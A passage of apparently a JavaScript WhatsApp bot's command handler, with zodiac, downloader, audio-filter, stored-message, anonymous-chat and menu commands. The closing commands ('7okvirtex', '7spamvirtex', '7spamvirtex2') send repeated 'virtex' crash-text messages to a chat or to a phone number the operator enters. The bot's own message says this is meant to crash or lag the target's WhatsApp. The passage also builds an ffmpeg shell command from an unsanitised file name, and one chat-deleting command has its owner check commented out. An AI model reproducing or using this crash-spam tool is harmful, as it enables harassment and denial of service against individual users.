case '7zodiak': case '7zodiac': {
                if (!text) throw `*Masukan tahun bulan tanggal*\n_Contoh :_ ${prefix+ command} 2005 09 05`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break

            case '7umma': case '7ummadl': {
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `${prefix}ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '🎵Audio🎵'}, type: 1},
                        {buttonId: `${prefix}ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '🎥Video🎥'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
To download media, please click one of the buttons below or enter the ytmp3/ytmp4 command with the url above
`,
			footer:  `${global.fake}`,
			buttons,
			headerType: 4
		    }
		    XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        XeonBotInc.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case '7ringtone': {
		if (!text) throw `_Contoh :_ ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		XeonBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		
/*case '7alkitab':  if(!text) throw `Masukan Search Yang Anda Cari`
epep = await.fetchJson(`https://melcanz.com/alkitabsearch?q=${text}&apikey=melcantik`)
break*/

		   case '7bass': case '7blown': case '7deep': case '7earrape': case '7fast': case '7fat': case '7nightcore': case '7reverse': case '7robot': case '7slow': case '7smooth': case '7squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                replay(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply(err)
                let buff = fs.readFileSync(ran)
                XeonBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else reply(`Reply to the audio you want to change with caption *${prefix + command}*`)
                } catch (e) {
                reply(e)
                }
                break
case '7clearall':
            // if (!isOwner) return  reply(mess.only.owner)
             anu = await XeonBotInc.chats.all()
             XeonBotInc.setMaxListeners(25)
             for (let _ of anu) {
             XeonBotInc.deleteChat(_.jid)
}
             reply('Sukses delete all chat :)')
             break
            case '7setcmd': {
                if (!m.quoted) throw `*Reply sticker/image dengan caption* ${prefix + command} ${prefix}command nya\n\n_Contoh:_ ${prefix + comnand} ${prefix}menu`
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `*Untuk Command Apa?*\n_Contoh:_ ${prefix}menu`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                reply(`Done!`)
            }
            break
            case '7delcmd': {
            	if (!m.quoted) throw `Reply sticker/image yang menjadi key cmd,untuk di hapus dari database cmd`
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `No hashes`
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.sticker[hash]
                reply(`Done!`)
            }
            break
            case '7listcmd': {
                let teks = `
*Hash List*
Info: *bold* hash is locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                XeonBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case '7lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Message!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.sticker)) throw 'Hash not found in database'
                global.db.sticker[hash].locked = !/^un/i.test(command)
                reply('Done!')
            }
            break
            case '7addmsg': {
                if (!m.quoted) throw 'Reply Pesan Untuk Disimpan Dalam Database'
                if (!text) throw `*Masukan Teks untuk kata kunci pesan!*\n_Contoh:_ ${prefix + command} wow`
                let msgs = global.db.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Successfully added message in message list as '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list pesan dengan ${prefix}listmsg`)
            }
            break
            case '7getmsg': {
                if (!text) throw `*Masukan key message!*\n Lihat list msg dengan ${prefix}listmsg`
                let msgs = global.db.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' not registered in message list`
                XeonBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
case '7nuklir': {
              if (!text) throw `Example : ${prefix + command} msg name\n\nView message list with ${prefix}listmsg`
                let msgs = global.db.database
               if (!(text.toLowerCase() in msgs)) throw `'${text}' not registered in message list`
                XeonBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case '7listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        reply(teks)
	    }
	    break
            case '7delmsg': case '7deletemsg': {
            	if (!text) throw `*Masukan key message yang mau di hapus!*\n Lihat list msg dengan ${prefix}listmsg`
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return reply(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		reply(`Successfully deleted '${text}' from the message list`)
            }
	    break
	    case '7anonymous': {
                if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [{
                                urlButton: {
                                    displayText: 'Report Bug🐛',
                                    url: 'https://wa.me/916909137213?text=hello+bro+i+found+a+bug+in+your+bot'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '👻Start Anonymous👻',
                                    id: 'start'
                                }
                            }]
                XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await XeonBotInc.getName(m.sender)} Welcome To Anonymous Chat\n\nClick The Button Below To Find A Partner\`\`\``,  `${global.fake}`, m)
            }
			break
case '7sendkontak': case '7sendcontact': {
                if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: '🚶Start🚶' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `_You Are Not In Anonymous Session, Press The Button To Find A Partner_`)
                    throw false
                }
                let profile = await XeonBotInc.profilePictureUrl(room.b)
                let status = await XeonBotInc.fetchStatus(room.b)
                let msg = await XeonBotInc.sendImage(room.a, profile, `Name : ${await XeonBotInc.getName(room.b)}\nBio : ${status.status}\nUser : @${room.b.split("@")[0]}`, m, { mentions: [room.b] })
                XeonBotInc.sendContact(room.a, [room.b.split("@")[0]], msg)
            }
            break
            case '7stop': case '7keluar': case '7leave': {
                if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: '🚶Start🚶' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `_You Are Not In Anonymous Session, Press The Button To Find A Partner_`)
                    throw false
                }
                reply('Ok')
                let other = room.other(m.sender)
                if (other) await XeonBotInc.sendText(other, `_Partner Has Left Anonymous Session_`, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case '7mulai': case '7start': {
                if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: '.keluar', buttonText: { displayText: '😏Stop😏' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `_You Are Still In Anonymous Session, Press The Button Below To Terminate Your Anonymous Session_`,  `${global.fake}`, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: '.next', buttonText: { displayText: '🍃Skip🍃' }, type: 1 },
                        { buttonId: '.keluar', buttonText: { displayText: '😏Stop😏' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(room.a, buttons, `_Successfully Found Partner, Now You Can Send Messages_`,  `${global.fake}`, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await XeonBotInc.sendButtonText(room.b, buttons, `_Successfully Found Partner, Now You Can Send Messages_`,  `${global.fake}`, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: '😏Stop😏' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `_Please Wait, Looking For A Partner_`,  `${global.fake}`, m)
                }
                break
            }
            case '7skip':  case '7next': case '7lanjut': {
                if (m.isGroup) return reply('This Feature Cannot Be Used In Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: '.start', buttonText: { displayText: '🚶Start🚶' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In Anonymous Session, Press The Button To Find A Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await XeonBotInc.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: '🍃Skip🍃' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: '😏Stop😏' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``,  `${global.fake}`, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await XeonBotInc.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``,  `${global.fake}`, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: '😏Stop😏' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``,  `${global.fake}`, m)
                }
                break
            }
            case '7public': {
                if (!isCreator) throw mess.owner
                XeonBotInc.public = true
                reply('Successfully Changed To Public Usage')
            }
            break
            case '7self': {
                if (!isCreator) throw mess.owner
                XeonBotInc.public = false
                reply('Successfully Changed To Self Usage')
            }
            break
            case '7ping': case '7botstatus': case '7statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

NodeJS Memory Usaage
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                reply(respon)
            }
            break
            case '7owner': case '7creator': {
            XeonBotInc.sendContact(m.chat, global.pemilik, m)
           const devsound = fs.readFileSync('./BotMedia/botdev.mp3') //u can change the music in BotMedia folder
           XeonBotInc.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
            }
            break
                    case '7bug': case '7report': {
                    	if(!text) throw `Enter The Bug Example\n\n${prefix + command} Menu Error `
                    	XeonBotInc.sendMessage(`${global.pemilik}@s.whatsapp.net`, {text: `*Bug Report From:* wa.me/${m.sender.split("@")[0]}
Report Message: ${text}` })
reply(`Successfully Reported To The Owner\n\nPlease Make Sure The Bug Is Valid, If You Play With This, Use This Feature Again And Again For No Reason, You Will Be Blocked For Sure !`)
                    }
                    break 
                    
case '7tes': case '7test': case '7alive': case '7bot': case '7robot': case '7cheems': case '7doge':{
                          timestampe = speed();
latensie = speed() - timestampe
  	anu = ` Hi 🤚 ${pushname}
${global.botnma} in here
`
  let message = await prepareWAMessageMedia({ video: global.vidmenu3, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `Button tidak muncul?, ketik ${prefix}allmenu untuk menampilkan semua fitur BOT\n\n${global.fake}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                            	urlButton: {
                                displayText: `${global.medsos2}`,
                                    url: `${global.medsos2url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗔𝗹𝗹 𝗠𝗲𝗻𝘂',
                                    id: `${prefix}allmenu`
                                }
                                }, {
                                quickReplyButton: {
                                    displayText: '𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂',
                                    id: `${prefix}command`
                                }
                                }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
break


            case 'list': case 'menu': case 'help': case '?': {
          timestampe = speed();
latensie = speed() - timestampe
  	anu = ` Hi 🤚 ${pushname}
How Are You? 😊


Instagram : @ini.lleo
Wa Jasa Post : wa.me/62895-3373-1687-9
Wa Rekber : wa.me/62858-9693-2340

`
  let message = await prepareWAMessageMedia({ video: global.vidmenu1, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `PLEASE SELECT THE BUTTON BELOW\n© ${global.botnma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `WA Jasa Post`,
                                    url: `https://wa.me/+62895337316879`
                                }
                            }, {
                            	urlButton: {
                                displayText: `WA Rekber`,
                                    url: `https://wa.me/62858-9693-2340`
                                }
                            }, {
                                urlButton: {
                                displayText: `Instagram`,
                                    url: `https://instagram.com/ini.lleo?igshid=YmMyMTA2M2Y=`
                                }
                                }, {
                                callButton: {
                                    displayText: 'Owner Number👤',
                                    phoneNumber: `62895337316879`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER',
                                    id: `${prefix}7owner`
                                    }
}]
                        }
                    }
                }), { userJid: m.chat })
                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
break

            








case '7okvirtex': {
	if (!isCreator) return reply(mess.owner)
            	anu = `${global.virtex}\n${global.virtex}`
  let message = await prepareWAMessageMedia({ video: fs.readFileSync('./media/menu.mp4'), gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `${global.virtex}\n${global.virtex}\n${global.virtex}\n${global.virtex}`,
           hydratedButtons: [{
                                urlButton: {
                                    displayText: `TODD`,
                                    url: `${global.virtex}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '👤Owner👤',
                                    id: `${global.virtex}`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
                XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
            await sleep(3000)            
               XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                await sleep(3000)            
               XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
            await sleep(3000)            
               XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
             await sleep(3000)            
              XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
              await sleep(3000)            
               XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                XeonBotInc.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
  }
  
break

case '7spamvirtex': {
	if (!isCreator) return reply(mess.owner)
	if (!text) throw `*Masukan nomor yg mau di spam virtex !*\n\n_Contoh:_ ${prefix + command} 628xxxxxxxxx`
	let buttons = [
                     {buttonId: `${prefix}spamvirtex2 GAS+${text}`, buttonText: {displayText: `LUNCURKAN VIRTEX ke ${text}`}, type: 1}
                ]

                let buttonMessage = {
                    text: `Bot akan meluncurkan 51 virtex ke nomor ${text}\n*Hal ini dapat memicu crash/lag pada aplikasi WhatsApp yang di pasang bot ini (jika tidak menggunakan wa imun)*\n\n*Tindakan ini juga  beresiko nomor bot terbanned oleh WhatsApp karena perbuatan spam !*\n  *UNTUK MELANJUTKAN TINDAKAN INI KLIK TOBOL DI BAWAH INI*`,
                    footer: `Klik tombol di bawah untuk melanjutkan, Untuk membatalkan abaikan pesan`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
}

break
case '7spamvirtex2': {
tas = arg.split('+')[0]
              wah = arg.split('+')[1]
	if (!isCreator) return reply(mess.owner)
	if (!text) throw `*Masukan nomor yg mau di spam virtex !*\n\n_Contoh:_ ${prefix}spamvirtex2 GAS+628xxxxxxxxx`
            if (wah === '6283110011351') throw 'Itu nomor developer bot GOBLOK !!!'
            if (wah === '6285230122985') throw 'Itu nomor developer bot GOBLOK !!!'
	       if (wah === '6283161562525') throw 'Itu nomor developer bot GOBLOK !!!'
           if (wah === '6289630883352') throw 'Itu nomor developer bot GOBLOK !!!'

let message = await prepareWAMessageMedia({ video: fs.readFileSync('./media/menu.mp4'), gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: `${global.virtex}\n${global.virtex}`,
           hydratedFooterText: `${global.virtex}\n${global.virtex}\n${global.virtex}\n${global.virtex}`,
           hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.botnma}`,
                                    url: `copy ${global.virtex}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Excuse Me',
                                    id: `.copy ${global.virtex}`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                replay(`MEMPEROSES PELUNCURAN`)
    	               XeonBotInc.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
